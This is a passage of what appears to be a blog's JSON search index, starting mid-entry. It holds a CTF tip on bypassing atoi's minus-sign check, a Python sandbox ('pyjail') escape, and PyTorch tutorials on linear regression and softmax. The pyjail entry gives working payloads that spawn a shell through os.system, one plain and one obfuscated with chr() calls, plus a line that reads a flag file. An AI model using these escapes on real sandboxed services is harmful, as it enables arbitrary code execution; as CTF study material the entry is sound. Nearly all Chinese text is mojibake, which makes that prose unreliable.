up, for that is just the place and time that the tide will turn. â€” Harriet Beecher Stowe å…ˆè¾“å…¥ç©ºæ ¼å°±å¥½äº†ï¼Œatoiä¼šè·³è¿‡ç©ºæ ¼","tags":["pwn","atoi"],"title":"ç»•è¿‡atoiå‰å¯¹é¦–å­—ç¬¦æ˜¯å¦ä¸ºè´Ÿå·çš„æ£€æŸ¥"},{"categories":["tricks"],"contents":" Happiness cannot be travelled to, owned, earned, worn or consumed. Happiness is the spiritual experience of living every minute with love, grace and gratitude. â€” Denis Waitley\nåŸºç¡€ç‰ˆ __import__(\u0026#39;os\u0026#39;).system(\u0026#39;sh\u0026#39;) è¿›é˜¶ç‰ˆ getattr(getattr(getattr(getattr(().__class__,chr(95)+chr(95)+chr(98)+chr(97)+chr(115)+chr(101)+chr(95)+chr(95)),chr(95)+chr(95)+chr(115)+chr(117)+chr(98)+chr(99)+chr(108)+chr(97)+chr(115)+chr(115)+chr(101)+chr(115)+chr(95)+chr(95))()[-4],chr(95)+chr(95)+chr(105)+chr(110)+chr(105)+chr(116)+chr(95)+chr(95)),chr(95)+chr(95)+chr(103)+chr(108)+chr(111)+chr(98)+chr(97)+chr(108)+chr(115)+chr(95)+chr(95))[chr(115)+chr(121)+chr(115)+chr(116)+chr(101)+chr(109)](chr(115)+chr(104)) å¦‚æœçŸ¥é“flagæ–‡ä»¶çš„åå­—ï¼Œå¯ä»¥ç”¨:\nopen(chr(102)+chr(108)+chr(97)+chr(103)).read() æ›´å¤šèµ„æ–™å‚è§https://zhuanlan.zhihu.com/p/578986988\n","date":"2022å¹´12æœˆ23æ—¥","permalink":"https://peterliuzhi.top/tricks/%E7%BB%95%E8%BF%87pyjail%E4%B8%80%E5%8F%A5%E8%AF%9Drce/","section":"tricks","summary":"Happiness cannot be travelled to, owned, earned, worn or consumed. Happiness is the spiritual experience of living every minute with love, grace and gratitude. â€” Denis Waitley åŸºç¡€ç‰ˆ __import__(\u0026#39;os\u0026#39;).system(\u0026#39;sh\u0026#39;) è¿›é˜¶ç‰ˆ getattr(getattr(getattr(getattr(().__class__,chr(95)+chr(95)+chr(98)+chr(97)+chr(115)+chr(101)+chr(95)+chr(95)),chr(95)+chr(95)+chr(115)+chr(117)+chr(98)+chr(99)+chr(108)+chr(97)+chr(115)+chr(115)+chr(101)+chr(115)+chr(95)+chr(95))()[-4],chr(95)+chr(95)+chr(105)+chr(110)+chr(105)+chr(116)+chr(95)+chr(95)),chr(95)+chr(95)+chr(103)+chr(108)+chr(111)+chr(98)+chr(97)+chr(108)+chr(115)+chr(95)+chr(95))[chr(115)+chr(121)+chr(115)+chr(116)+chr(101)+chr(109)](chr(115)+chr(104)) å¦‚æœçŸ¥é“flagæ–‡ä»¶çš„åå­—ï¼Œå¯ä»¥ç”¨: open(chr(102)+chr(108)+chr(97)+chr(103)).read() æ›´å¤šèµ„æ–™å‚è§https://zhuanla","tags":["web","pyjail"],"title":"ç»•è¿‡pyjailâ€”â€”ä¸€å¥è¯RCE"},{"categories":["principle","Introduction"],"contents":" Every great dream begins with a dreamer. Always remember, you have within you the strength, the patience, and the passion to reach for the stars to change the world. â€” Harriet Tubman\nDeepLearning åŸºæœ¬æ¡†æ¶ æ¢¯åº¦:ä¸‹å±±æœ€å¿«çš„æ–¹å‘ Losså‡½æ•° æ¢¯åº¦åˆ°åº•æ˜¯å•¥? åŸºæœ¬æ¡†æ¶ æ•´ä¸ªç¥ç»ç½‘ç»œå°±æ˜¯ä¸€ä¸ªå‡½æ•°\næ¯ä¸€ä¸ªç‚¹éƒ½æ˜¯ä¸€ä¸ªç¥ç»å…ƒï¼Œæ¯ä¸€ä¸ªç¥ç»å…ƒçš„æ¯ä¸€æ¬¡ä¼ å¯¼éƒ½æœ‰è‡ªå·±çš„æƒé‡(weight)å’Œåç½®(bias)ï¼Œæœ€åä¹˜ä¸Šæ¿€æ´»å‡½æ•°(activation function)æ¥æ¨¡æ‹Ÿç”Ÿç‰©ç¥ç»å…ƒçš„æ¿€æ´» æ¢¯åº¦:ä¸‹å±±æœ€å¿«çš„æ–¹å‘ Question:åº”è¯¥å¦‚ä½•è°ƒæ•´weightå’Œbiasæ‰èƒ½æœ€å¿«å‡å°‘ç½‘ç»œåˆ¤æ–­ç»“æœå’ŒçœŸå®ç»“æœä¹‹é—´çš„å·®è·ï¼Ÿ\nå…ˆå¼•å…¥å‡ ä¸ªæ¦‚å¿µ\nLosså‡½æ•° å¯¹æœ€ååˆ¤å®šçš„å€¼\rè€Œè¨€ï¼Œå®ƒä¸çœŸå®å€¼yæœ‰ä¸€å®šå·®è· ä¸ºè¡¨è¾¾è¯¯å·®,æˆ‘ä»¬å®šä¹‰Losså‡½æ•°:\r,äº¦ç§°ä¸ºå¹³æ–¹æŸå¤±(square loss) æ•´ä¸ªLosså‡½æ•°ä¸º: è€Œä½¿è¯¥Losså‡½æ•°æœ€å°çš„å‚æ•°è®°ä¸º: æ¢¯åº¦åˆ°åº•æ˜¯å•¥? definition:æ¢¯åº¦çš„æœ¬æ„æ˜¯ä¸€ä¸ªå‘é‡ï¼ˆçŸ¢é‡ï¼‰ï¼Œè¡¨ç¤ºæŸä¸€å‡½æ•°åœ¨è¯¥ç‚¹å¤„çš„æ–¹å‘å¯¼æ•°æ²¿ç€è¯¥æ–¹å‘å–å¾—æœ€å¤§å€¼ï¼Œå³å‡½æ•°åœ¨è¯¥ç‚¹å¤„æ²¿ç€è¯¥æ–¹å‘ï¼ˆæ­¤æ¢¯åº¦çš„æ–¹å‘ï¼‰å˜åŒ–æœ€å¿«ï¼Œå˜åŒ–ç‡æœ€å¤§ï¼ˆä¸ºè¯¥æ¢¯åº¦çš„æ¨¡ï¼‰ã€‚\næ¢¯åº¦ä¸‹é™æ³•ï¼ˆè‹±è¯­ï¼šGradient descentï¼‰æ˜¯ä¸€ä¸ªä¸€é˜¶æœ€ä¼˜åŒ–ç®—æ³•ï¼Œé€šå¸¸ä¹Ÿç§°ä¸ºæœ€é™¡ä¸‹é™æ³•ï¼Œä½†æ˜¯ä¸è¯¥ä¸è¿‘ä¼¼ç§¯åˆ†çš„æœ€é™¡ä¸‹é™æ³•ï¼ˆè‹±è¯­ï¼šMethod of steepest descentï¼‰æ··æ·†ã€‚ è¦ä½¿ç”¨æ¢¯åº¦ä¸‹é™æ³•æ‰¾åˆ°ä¸€ä¸ªå‡½æ•°çš„å±€éƒ¨æå°å€¼ï¼Œå¿…é¡»å‘å‡½æ•°ä¸Šå½“å‰ç‚¹å¯¹åº”æ¢¯åº¦ï¼ˆæˆ–è€…æ˜¯è¿‘ä¼¼æ¢¯åº¦ï¼‰çš„åæ–¹å‘çš„è§„å®šæ­¥é•¿è·ç¦»ç‚¹è¿›è¡Œè¿­ä»£æœç´¢ã€‚å¦‚æœç›¸ååœ°å‘æ¢¯åº¦æ­£æ–¹å‘è¿­ä»£è¿›è¡Œæœç´¢ï¼Œåˆ™ä¼šæ¥è¿‘å‡½æ•°çš„å±€éƒ¨æå¤§å€¼ç‚¹ï¼›è¿™ä¸ªè¿‡ç¨‹åˆ™è¢«ç§°ä¸ºæ¢¯åº¦ä¸Šå‡æ³•ã€‚\nå› æ­¤æ¯ä¸€æ¬¡æ¢¯åº¦ä¸‹é™å°±å¥½åƒä¸‹å±±(é™ä½Loss),ç­‰åˆ°è¾¾å±±è°·çš„æœ€ä½å¤„(Lossçš„æœ€ä½å¤„)å°±è¾¾åˆ°äº†è®­ç»ƒçš„ç›®çš„\n","date":"2022å¹´11æœˆ16æ—¥","permalink":"https://peterliuzhi.top/principle/%E6%B7%B1%E5%BA%A6%E5%AD%A6%E4%B9%A0/introduction/deeplearning%E4%BB%8B%E7%BB%8D/","section":"principle","summary":"Every great dream begins with a dreamer. Always remember, you have within you the strength, the patience, and the passion to reach for the stars to change the world. â€” Harriet Tubman DeepLearning åŸºæœ¬æ¡†æ¶ æ¢¯åº¦:ä¸‹å±±æœ€å¿«çš„æ–¹å‘ Losså‡½æ•° æ¢¯åº¦åˆ°åº•æ˜¯å•¥? åŸºæœ¬æ¡†æ¶ æ•´ä¸ªç¥ç»ç½‘ç»œå°±æ˜¯ä¸€ä¸ªå‡½","tags":["deeplearning","intro"],"title":"DeepLearningä»‹ç»"},{"categories":["principle","SimpleImplement"],"contents":" The attempt to combine wisdom and power has only rarely been successful and then only for a short while. â€” Albert Einstein\nçº¿æ€§å›å½’çš„ç®€å•å®ç° å®šä¹‰å‡½æ•° å®šä¹‰æ¨¡å‹å‡½æ•°(X*W+b) å®šä¹‰ Loss å‡½æ•°1/2(y_hat - y)^2ï¼Œè®¡ç®—ç½‘ç»œæ‰€å¾—ç»“æœå’ŒçœŸå®ç»“æœä¸­é—´çš„å·®è· å®šä¹‰ä¼˜åŒ–å‡½æ•°ï¼Œè°ƒæ•´ weight å’Œ bias å®šä¹‰æ•°æ®é€‰å–å‡½æ•°ï¼Œéšæœºé€‰å–å°æ‰¹æ¬¡æ•°æ®ï¼ˆéšæœºæ¢¯åº¦ä¸‹é™æ³•ï¼‰ å®šä¹‰ç”Ÿæˆ weight å’Œ bias çš„éšæœºå‡½æ•° å®šä¹‰è®­ç»ƒå‡½æ•° æ‰§è¡Œè®­ç»ƒ å®šä¹‰å‡½æ•° å®šä¹‰æ¨¡å‹å‡½æ•°(X*W+b) æ³¨æ„ï¼Œå› ä¸ºè¿™æ˜¯çº¿æ€§å›å½’æ¨¡å‹ï¼Œä¸éœ€è¦å¼•å…¥éçº¿æ€§ï¼Œè‡ªç„¶ä¹Ÿä¸ç”¨å¼•å…¥æ¿€æ´»å‡½æ•°\n# å®šä¹‰æ¨¡å‹ï¼ˆå‡½æ•°ï¼‰,æ­¤å¤„çš„æ¨¡å‹æ˜¯æœ€åŸºæœ¬çš„çŸ©é˜µä¹˜æ³• def linMul(x,w,b): return torch.mm(x,w) + b å®šä¹‰ Loss å‡½æ•°1/2(y_hat - y)^2ï¼Œè®¡ç®—ç½‘ç»œæ‰€å¾—ç»“æœå’ŒçœŸå®ç»“æœä¸­é—´çš„å·®è· # å®šä¹‰Losså‡½æ•° def Loss(y_hat, y): # 1/2*(y_hat - y)^2 return (y_hat - y.view(y_hat.size()))**2/2 å®šä¹‰ä¼˜åŒ–å‡½æ•°ï¼Œè°ƒæ•´ weight å’Œ bias # å®šä¹‰ä¼˜åŒ–ç®—æ³• def sgd(params, lr, batch_size): # paramsæ˜¯weightå’Œbiasçš„åˆ—è¡¨ for param in params: param.data -= lr*param.grad / batch_size å®šä¹‰æ•°æ®é€‰å–å‡½æ•°ï¼Œéšæœºé€‰å–å°æ‰¹æ¬¡æ•°æ®ï¼ˆéšæœºæ¢¯åº¦ä¸‹é™æ³•ï¼‰ # å®šä¹‰æ•°æ®åŠå…¶è¿­ä»£å™¨ # æŠŠæ•°æ®åˆ†æ‰¹æ¬¡ def data_iter(features: torch.tensor, batch_size:int, labels:torch.tensor): total_size = len(features) # print(f\u0026#34;total size:{total_size}\u0026#34;) indexes = list(range(0,total_size)) random.shuffle(indexes) for i in range(0, total_size, batch_size): choice = torch.tensor(indexes[i:min(i+batch_size, total_size)]) yield features.index_select(0,choice), labels.index_select(0,choice) å®šä¹‰ç”Ÿæˆ weight å’Œ bias çš„éšæœºå‡½æ•° maker = lambda x,y,z: torch.tensor([[round(ele.item(),10) for ele in np.random.normal(0,x,y)]],dtype=torch.float32, requires_grad=z) å®šä¹‰è®­ç»ƒå‡½æ•° # å®šä¹‰è®­ç»ƒå‡½æ•° def train(num_epoches, lr, features, batch_size, labels, hat_w, hat_b, true_w, true_b): for epoch in range(num_epoches): for x,y in data_iter(features, batch_size, labels): lab_tmp = linMul(x, hat_w.T, hat_b) # print(lab_tmp) l = Loss(lab_tmp, y).sum() l.backward() sgd([hat_w, hat_b], lr, batch_size) hat_w.grad.data.zero_() hat_b.grad.data.zero_() train_l = Loss(linMul(features, hat_w.T, hat_b), labels).sum() print(f\u0026#34;epoch {epoch}, loss:{train_l}\u0026#34;) print(f\u0026#34;true weight:{true_w}, hat weight:{hat_w}\u0026#34;) print(f\u0026#34;true bias:{true_b}, hat bias:{hat_b}\u0026#34;) æ‰§è¡Œè®­ç»ƒ def main(): # å…ˆå®šä¹‰çœŸæ­£çš„w\u0026amp;bï¼Œè¿˜æœ‰åº”è¯¥å¾—åˆ°çš„ç»“æœ true_w = maker(10,2,False) true_b = maker(5,1,False) print(f\u0026#34;true weight:{true_w}, true bias:{true_b}\u0026#34;) #å®šä¹‰1000ä¸ªæ•°æ®(ç‰¹å¾å€¼) features = torch.randn((1000, 2)) print(f\u0026#34;features:{features}\u0026#34;) # å®šä¹‰çœŸå€¼ labels = linMul(features, true_w.T, true_b) # åˆå§‹åŒ–å‚æ•° hat_w = maker(0.01,2,True) hat_b = maker(0.01,1,True) # å®šä¹‰å­¦ä¹ ç‡å’Œè¿­ä»£æ¬¡æ•° lr = 0.03 num_epoches = 10 train(num_epoches, lr, features, 10, labels, hat_w, hat_b, true_w, true_b) ","date":"2022å¹´11æœˆ16æ—¥","permalink":"https://peterliuzhi.top/principle/%E6%B7%B1%E5%BA%A6%E5%AD%A6%E4%B9%A0/simpleimplement/linearregression/","section":"principle","summary":"The attempt to combine wisdom and power has only rarely been successful and then only for a short while. â€” Albert Einstein çº¿æ€§å›å½’çš„ç®€å•å®ç° å®šä¹‰å‡½æ•° å®šä¹‰æ¨¡å‹å‡½æ•°(X*W+b) å®šä¹‰ Loss å‡½æ•°1/2(y_hat - y)^2ï¼Œè®¡ç®—ç½‘ç»œæ‰€å¾—ç»“","tags":["deeplearning","çº¿æ€§å›å½’","completion"],"title":"LinearRegression"},{"categories":["principle","softmax"],"contents":" Imagination is more important than knowledge. For while knowledge defines all we currently know and understand, imagination points to all we might yet discover and create. â€” Albert Einstein\nsoftmax å›å½’æ¦‚è¿° softmax å›å½’æ˜¯ä»€ä¹ˆ Softmax å…¬å¼ Softmax å›å½’çš„ Loss å‡½æ•°â€”â€”äº¤å‰ç†µæŸå¤±å‡½æ•° softmax å›å½’æ˜¯ä»€ä¹ˆ æœ‰æ—¶å€™æˆ‘ä»¬çš„è¾“å‡ºå€¼ä¸æ˜¯ä¸€ä¸ªå€¼ï¼Œè€Œæ˜¯ä¸€ä¸²ç¦»æ•£çš„å€¼ï¼ˆæ¯”å¦‚è¯†åˆ«æ‰‹å†™æ•°å­—ï¼‰ï¼Œè¿™æ—¶å€™æˆ‘ä»¬ä¸èƒ½ç®€å•åœ°çº¿æ€§åœ°è¡¨ç¤ºç»“æœï¼ˆçº¿æ€§çš„ç»“æœå¯ä»¥ä»»æ„å¤§ï¼Œéš¾ä»¥åˆ¤æ–­æ­¤æ—¶åº”è¯¥æ˜¯å“ªä¸€ä¸ªç¦»æ•£çš„å€¼ï¼Œçº¿æ€§å€¼ä¸ç¦»æ•£å€¼ä¹‹é—´çš„è¯¯å·®ä¹Ÿéš¾ä»¥è¡¡é‡ï¼‰ï¼Œè¿™æ—¶å€™æˆ‘ä»¬å°±éœ€è¦å°†ç»“æœè¡¨ç¤ºä¸ºæ¦‚ç‡ï¼Œå°†æ‰€æœ‰å€¼å‹ç¼©åœ¨$(0,1]$é—´\nè¿™æ—¶å€™å°±éœ€è¦æ‰€è°“çš„é€»è¾‘å‡½æ•°(sigmod å‡½æ•°)ï¼Œä¸åŒçš„æ˜¯ï¼Œsoftmax åœ¨è¾“å‡ºç»“æœç­‰äº 2 æ—¶é€€åŒ–å›é€»è¾‘å›å½’\nåŸåšå®¢åœ°å€\nsoftmax å‡½æ•°å’Œä¹‹å‰çš„çº¿æ€§å‡½æ•°ä¸€æ ·ï¼Œæ˜¯å…¨è¿æ¥å±‚çš„ï¼Œä¹Ÿå°±æ˜¯è¯´ï¼Œå®ƒçš„æ¯ä¸€ä¸ªç»“ç‚¹éƒ½ä¸ä¸Šä¸€å±‚çš„æ‰€æœ‰ç»“ç‚¹ç›¸è¿\nSoftmax å…¬å¼ å¯¹æ‰€æœ‰ç»“æœå–æŒ‡æ•°ç›¸åŠ ä½œä¸ºæ•´ä½“ï¼Œå†ç”¨å•ä¸ªèŠ‚ç‚¹çš„æŒ‡æ•°é™¤ä»¥è¿™ä¸ªæ•´ä½“å°±æ˜¯è¯¥èŠ‚ç‚¹çš„æ¦‚ç‡\n$$ \\hat{y_{1}},\\hat{y_{2}},\\hat{y_{3}} = softmax(o_{1},o_{2},o_{2}), $$\n$$ \\hat{y_{j}} = \\frac{exp(o_{j})}{\\sum_{i=1}^{3}exp(o_{i})} (j = 1,2,3) $$\nå› æ­¤æ¨¡å‹å…¬å¼ä¸ºï¼š\n$$ \\hat{Y} = softmax(XW+b) $$\nSoftmax å›å½’çš„ Loss å‡½æ•°â€”â€”äº¤å‰ç†µæŸå¤±å‡½æ•° å› ä¸ºå¹³æ–¹å·®æŸå¤±å‡½æ•°æ€»æ˜¯è¦æ±‚æ¨¡æ‹Ÿç»“æœå’Œé¢„æœŸç»“æœå®Œå…¨æ‹Ÿåˆï¼Œå¯¹ Softmax å›å½’è¿™ç§å¤šä¸ªè¾“å‡ºè®¡ç®—æ¦‚ç‡çš„å›å½’è¿‡äºä¸¥æ ¼ï¼Œå› æ­¤åº”è¯¥é‡‡ç”¨ä¸€ç§åªè¦æŸä¸€èŠ‚ç‚¹çš„æ¦‚ç‡è¿œé«˜äºå…¶ä»–èŠ‚ç‚¹å°±åˆ¤å®šæ‹Ÿåˆçš„ Loss å‡½æ•°ï¼Œå› æ­¤æˆ‘ä»¬é‡‡ç”¨äº¤å‰ç†µæŸå¤±å‡½æ•°ï¼š å¯¹ç¬¬ i ç»„æ•°æ®ï¼š\n$$ H(y^{(i)}, \\hat{y}^{(i)}) = -\\sum_{j=1}^{q} y_{j}^{(i)}\\log {\\hat{y}_{j}^{(i)}},å…¶ä¸­jä¸ºæ¨¡æ‹Ÿçš„ç¬¬jä¸ªèŠ‚ç‚¹ $$\nå› æ­¤ Loss å‡½æ•°æ˜¯ï¼š\n$$ l(\\Theta) = \\frac{1}{n} \\sum_{i=1}^{n} H(y^{(i)}, \\hat{y}^{(i)}) = \\frac{1}{n} \\sum_{i=1}^{n} y_{j}^{(i)}\\log {\\hat{y}_{j}^{(i)}},å…¶ä¸­nä¸ºå½“å‰æ‰¹æ¬¡çš„æ•°æ®ä¸ªæ•° $$\nåˆå› ä¸ºæ¯ä¸ªç»“æœçš„çœŸå®å€¼ï¼ˆæ¦‚ç‡ï¼‰ä¸æ˜¯ 0 å°±æ˜¯ 1ï¼Œä¸”åªæœ‰ä¸€ä¸ªèŠ‚ç‚¹çœŸå®å€¼ä¸º 1ï¼Œæ‰€ä»¥æ‰€è°“çš„\n$$ -\\sum_{j=1}^{q} y_{j}^{(i)}\\log {\\hat{y}_{j}^{(i)}} $$\nå…¶å®åªæœ‰ä¸€é¡¹ï¼Œä¸º\n$$ -y_{k}^{(i)} \\log {\\hat{y}_{k}^{(i)}}=-\\log {\\hat{y}_{k}^{(i)}} $$\nå…¶ä¸­ k ä¸ºæ¦‚ç‡ä¸º 1 çš„èŠ‚ç‚¹ k\nå› æ­¤äº¤å‰ç†µæŸå¤±å‡½æ•°å°±æ˜¯çœŸèŠ‚ç‚¹ï¼ˆæ¦‚ç‡ä¸º 1 çš„èŠ‚ç‚¹ï¼‰çš„æ¨¡æ‹Ÿå€¼çš„å¯¹æ•°ä¹‹å’Œçš„å‡å€¼çš„è´Ÿæ•°\nåŒæ—¶æˆ‘ä»¬ä¹Ÿå¯ä»¥çœ‹åˆ°ï¼ŒLoss å‡½æ•°ç­‰ä»·äºï¼š\n$$ exp(nl(\\Theta)) = \\prod_{i=1}^{n} \\hat{y}_{k}^{(i)} $$\nå› æ­¤æœ€å°åŒ–äº¤å‰ç†µæŸå¤±å‡½æ•°ç­‰ä»·äºæœ€å¤§åŒ–è®­ç»ƒæ•°æ®é›†æ‰€æœ‰æ ‡ç­¾ç±»åˆ«çš„è”åˆé¢„æµ‹æ¦‚ç‡\næ„Ÿè°¢å¥”è·‘çš„å°ä»™å¥³çš„åšå®¢\n","date":"2022å¹´11æœˆ16æ—¥","permalink":"https://peterliuzhi.top/principle/%E6%B7%B1%E5%BA%A6%E5%AD%A6%E4%B9%A0/softmax/softmax-intro/","section":"principle","summary":"Imagination is more important than knowledge. For while knowledge defines all we currently know and understand, imagination points to all we might yet discover and create. â€” Albert Einstein softmax å›å½’æ¦‚è¿° softmax å›å½’æ˜¯ä»€ä¹ˆ Softmax å…¬å¼ Softmax å›å½’çš„ Loss å‡½æ•°â€”â€”äº¤å‰ç†µæŸå¤±å‡½æ•° softmax å›å½’æ˜¯ä»€ä¹ˆ æœ‰æ—¶å€™æˆ‘ä»¬çš„è¾“å‡ºå€¼ä¸","tags":["deeplearning","softmax"],"title":"softmax intro"},{"categories":["principle","softmax"],"contents":" True friendship is like sound health; the value of it is seldom known until it is lost. â€” Charles Caleb Colton\nsoftmax ç®€å•å®ç° éœ€è¦å¯¼å…¥çš„åº“ å®šä¹‰éœ€è¦çš„å‡½æ•° å®šä¹‰æ¨¡å‹å‡½æ•° å®šä¹‰äº¤å‰ç†µæŸå¤±å‡½æ•° å®šä¹‰å‡†ç¡®ç‡ å®šä¹‰ä¼˜åŒ–ç®—æ³• å®šä¹‰æ•°æ®åˆ†æ‰¹çš„å‡½æ•° è®­ç»ƒå‡½æ•° æµ‹è¯•è®­ç»ƒæˆæœ å¼€å§‹è®­ç»ƒ è®­ç»ƒç»“æœ éœ€è¦å¯¼å…¥çš„åº“ import torch import torchvision import numpy as np import torchvision.transforms as transforms å®šä¹‰éœ€è¦çš„å‡½æ•° ä¸€æ¬¡ç»Ÿè®¡å­¦ä¹ ç”±å­¦ä¹ çš„æ¨¡å‹ï¼Œå­¦ä¹ çš„ç­–ç•¥ï¼Œå­¦ä¹ çš„ç®—æ³•ç»„æˆ\nå®šä¹‰æ¨¡å‹å‡½æ•° å®šä¹‰ softmax å‡½æ•°ï¼Œå°†éçº¿æ€§å¼•å…¥çº¿æ€§å›å½’ä¹‹ä¸­\n# å®šä¹‰softmax def softmax(Oi: torch.Tensor): Oi_exp = Oi.exp() return Oi_exp/(Oi_exp.sum(dim=1, keepdim=True)) # å®šä¹‰æ¨¡å‹ def net(X: torch.Tensor, W: torch.Tensor, b: torch.Tensor): return softmax(torch.mm(X.view((-1, W.size()[0])), W)+b) å®šä¹‰äº¤å‰ç†µæŸå¤±å‡½æ•° å½¢å¼ä¸Šæ˜¯å¯¹æ•°æŸå¤±å‡½æ•°\nä¾é ç»éªŒè¯¯å·®å¯¹æ¨¡å‹è¿›è¡Œé€‰æ‹©\n# å®šä¹‰Losså‡½æ•° # äº¤å‰ç†µæŸå¤±å‡½æ•° # è¡¨ç°ä¸ºå¯¹æ•°æŸå¤±å‡½æ•° def Loss(y: torch.Tensor, y_hat: torch.Tensor): # è¿™é‡Œçš„yæ˜¯n*1çš„çŸ©é˜µï¼Œè€Œy_hatæ˜¯n*j return - torch.log(y_hat.gather(1, y.view(-1, 1))).sum() å®šä¹‰å‡†ç¡®ç‡ def accuracy(y: torch.Tensor, y_hat: torch.Tensor): # å¦‚æœæŸä¸€æ¬¡æ¨¡å‹é¢„æµ‹ç»“æœä¸çœŸå®ç»“æœç›¸åŒï¼Œå°±è¿”å›1ï¼Œå¦åˆ™è¿”å›0 # ç”¨argmaxå‡½æ•°è·å–y_hatä¸­æœ€å¤§é¡¹çš„ç´¢å¼•ï¼ˆ0~9ï¼‰ï¼Œä¸çœŸå®ç»“æœå¯¹æ¯” # è½¬åŒ–ä¸ºfloatååŠ å’Œï¼Œå–å…¶ä¸­çš„å€¼è¿”å› return (y_hat.argmax(1) == y).float().sum().item() å®šä¹‰ä¼˜åŒ–ç®—æ³• å’Œå‰é¢ä¸€æ ·çš„\n# å®šä¹‰ä¼˜åŒ–ç®—æ³• def sgd(params, lr, batch_size): for param in params: # å­¦ä¹ ç‡å°±æ˜¯ä¸€ä¸ªç”¨äºæ§åˆ¶ä¸‹é™å¹…åº¦çš„å¸¸æ•° # æƒé‡å’Œåç§»ä¼˜åŒ– param.data -= lr*param.grad / batch_size å®šä¹‰æ•°æ®åˆ†æ‰¹çš„å‡½æ•° def data_iter(mnist_test, batch_size): return torch.utils.data.DataLoader(mnist_test, batch_size=batch_size, shuffle=True, num_workers=0) è®­ç»ƒå‡½æ•° åªè¦è·å–åˆ°äº†è®­ç»ƒå¥½çš„æƒé‡å’Œåç§»ï¼Œå°±ç›¸å½“äºè·å¾—äº†è®­ç»ƒå¥½çš„æ¨¡å‹\ndef train(n_epoches: int, lr: float, w_hat: torch.Tensor, b_hat: torch.Tensor, batch: int, data: torch.Tensor) -\u0026gt; torch.Tensor: n_features = len(data) # ä¸€å…±æ‹Ÿåˆè®­ç»ƒæ•°æ®n_epochæ¬¡ for epoch in range(n_epoches): # åˆå§‹åŒ–æŸä¸€æ¬¡çš„ç»éªŒè¯¯å·®ï¼Œå‡†ç¡®ç‡ train_l, ac = 0.0, 0.0 # éšæœºæ¢¯åº¦ä¸‹é™æ³•ï¼Œå°†æ•°æ®åˆ†æ‰¹ for f, lb in data_iter(data, batch): y_hat = net(f, w_hat, b_hat) # è®¡ç®—å½“å‰æ‰¹æ¬¡ç»éªŒæŸå¤±å¹¶ä¸ä¸Šä¸€æ‰¹çš„æŸå¤±åŠ å’Œ l = Loss(lb, y_hat).sum() train_l += l # è®¡ç®—å‡†ç¡®ç‡ ac += accuracy(lb, y_hat) # åå‘æ±‚åå¯¼ l.backward() # åå‘ä¼˜åŒ–æ¨¡å‹ sgd([w_hat, b_hat], lr, batch) w_hat.grad.data.zero_() b_hat.grad.data.zero_() # å°†è¯¯å·®æ€»å’Œï¼Œå‡†ç¡®ç‡æ€»å’Œé™¤ä»¥è®­ç»ƒæ ·æœ¬å®¹é‡ train_l /= n_features ac /= n_features print(f\u0026#34;epoch {epoch}, loss:{train_l}, accuracy:{ac}\u0026#34;) print(f\u0026#34;hat weight:{w_hat}\u0026#34;) print(f\u0026#34;hat bias:{b_hat}\u0026#34;) return w_hat, b_hat æµ‹è¯•è®­ç»ƒæˆæœ def test(test_iter: torch.Tensor, w: torch.Tensor, b: torch.Tensor): ac = 0.0 batch_size = len(test_iter) for f, lb in data_iter(test_iter, batch_size): y_hypo = net(f, w, b) ac += accuracy(lb, y_hypo) ac /= batch_size print(f\u0026#34;test accuracy:{ac}\u0026#34;) å¼€å§‹è®­ç»ƒ def main(): batch_size = 256 # å¾—åˆ°çš„æ˜¯è®­ç»ƒç»„å’Œæµ‹è¯•ç»„ # ç”¨è®­ç»ƒç»„æ¥è®­ç»ƒæ¨¡å‹ï¼Œç”¨æµ‹è¯•ç»„æ¥æµ‹è¯•æ¨¡å‹å‡†ç¡®åº¦ train_iter = torchvision.datasets.FashionMNIST(root=\u0026#39;~/Datasets/FashionMNIST\u0026#39;, train=True, download=False, transform=transforms.ToTensor()) test_iter = torchvision.datasets.FashionMNIST(root=\u0026#39;~/Datasets/FashionMNIST\u0026#39;, train=False, download=False, transform=transforms.ToTensor()) # è¡Œæ•°*åˆ—æ•°ï¼Œæ˜¯ä¸€å¼ å›¾çš„åƒç´ æ€»é‡ num_inputs = 28*28 # æ ‡æ³¨é—®é¢˜ï¼Œåªæœ‰0~9ä¸€å…±10ä¸ªæ ‡æ³¨ num_outputs = 10 # åˆå§‹åŒ–æƒé‡ä¸åç§» w = torch.tensor(np.random.normal( 0, 0.01, (num_inputs, num_outputs)), dtype=torch.float, requires_grad=True) b = torch.zeros(num_outputs, dtype=torch.float, requires_grad=True) # è®­ç»ƒæ¨¡å‹ w, b = train(10, 0.03, w, b, batch_size, train_iter) # æµ‹è¯•æ¨¡å‹ test(test_iter, w, b) if __name__ == \u0026#34;__main__\u0026#34;: main() è®­ç»ƒç»“æœ epoch 0, loss:1.0356025695800781, accuracy:0.69585 epoch 1, loss:0.709172248840332, accuracy:0.7767 epoch 2, loss:0.6368897557258606, accuracy:0.7977333333333333 epoch 3, loss:0.597575306892395, accuracy:0.80825 epoch 4, loss:0.5720041394233704, accuracy:0.8157666666666666 epoch 5, loss:0.5530234575271606, accuracy:0.8211666666666667 epoch 6, loss:0.5385252833366394, accuracy:0.8246333333333333 epoch 7, loss:0.5267878770828247, accuracy:0.8280666666666666 epoch 8, loss:0.5172721743583679, accuracy:0.8301 epoch 9, loss:0.5093177556991577, accuracy:0.8327666666666667 hat weight:tensor([[ 3.6310e-03, -7.5329e-03, 3.7053e-03, ..., 3.1249e-02, -2.1517e-03, 2.2466e-03], [ 2.1203e-02, -8.7482e-03, 1.5493e-02, ..., -2.7951e-03, -6.2426e-03, 2.5957e-02], [ 1.7465e-02, 1.5385e-03, -2.2081e-03, ..., 1.4364e-02, 2.8634e-03, -2.0297e-02], ..., [ 9.7792e-05, 3.9122e-03, 2.1818e-02, ..., -1.7938e-02, 2.0017e-02, -7.0280e-03], [-2.0205e-04, -1.5446e-02, 3.1180e-03, ..., -1.0438e-02, -2.1133e-03, -6.5218e-03], [-3.9553e-03, 4.7967e-03, -1.0672e-02, ..., -4.2892e-03, -4.3317e-04, -1.1061e-02]], requires_grad=True) hat bias:tensor([ 0.0898, -0.0810, -0.0846, 0.0271, -0.4667, 1.0832, 0.2318, -0.0801, -0.2585, -0.4609], requires_grad=True) test accuracy:0.8204 ","date":"2022å¹´11æœˆ16æ—¥","permalink":"https://peterliuzhi.top/principle/%E6%B7%B1%E5%BA%A6%E5%AD%A6%E4%B9%A0/softmax/softmax%E7%AE%80%E5%8D%95%E5%AE%9E%E7%8E%B0/","section":"principle","summary":"True friendship is like sound health; the value of it is seldom known until it is lost. â€” Charles Caleb Colton softmax ç®€å•å®ç° éœ€è¦å¯¼å…¥çš„åº“ 